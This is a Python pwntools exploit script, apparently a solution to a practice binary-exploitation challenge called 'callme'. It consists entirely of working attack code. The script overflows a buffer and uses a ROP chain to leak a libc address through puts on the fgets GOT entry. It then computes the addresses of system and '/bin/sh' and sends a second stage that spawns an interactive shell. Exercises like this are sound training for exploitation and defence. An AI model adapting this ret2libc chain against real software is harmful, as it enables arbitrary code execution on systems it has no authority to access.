#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

def info(fgets_libc, libc_base, system, bin_sh):
    log.info("fgets@libc:  0x%x" % fgets_libc)
    log.success("leaked libc: 0x%x" % libc_base)
    log.info("system@libc: 0x%x" % system)
    log.info("binsh@libc:  0x%x" % bin_sh)

def create_stage(func, ret, arg):
    chain =  "A"*40
    chain += p64(0x401b23) # pop rdi; ret
    chain += p64(arg)
    chain += p64(func)
    if ret is not None: chain += p64(ret)
    return chain

def exploit():
    p = process('./callme')
    binary = ELF("callme", checksec=False)
    # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

    puts_plt  = binary.symbols["puts"]   
    main_addr = binary.symbols["main"]
    fgets_got = binary.symbols["got.fgets"]

    # create stage1 to leak libc through fgets
    stage1 =  create_stage(puts_plt, main_addr, fgets_got)
    p.sendlineafter('> ', stage1)
    fgets_libc = u64(p.recv().split()[0].strip().ljust(8, '\x00'))
    log.success('Stage 1 sent!')

    fgets_ofset = 0x06ece0 # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep fgets
    syst_offset = 0x0456a0 # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
    bin_sh_ofst = 0x18a040 # strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh ...or using pwntools: libc.search("/bin/sh").next()

    # calculate the actual addresses of the libc functions
    libc_base = fgets_libc - fgets_ofset
    system    = libc_base + syst_offset
    bin_sh    = libc_base + bin_sh_ofst

    # print out info leaked...
    info(fgets_libc, libc_base, system, bin_sh)

    # create the rop chain for stage 2 to spawn a shell
    log.info('Sending stage 2...')
    stage2 = create_stage(system, None, bin_sh)
    p.sendline(stage2)
    p.interactive()

if __name__ == '__main__':
    exploit()
#_EOF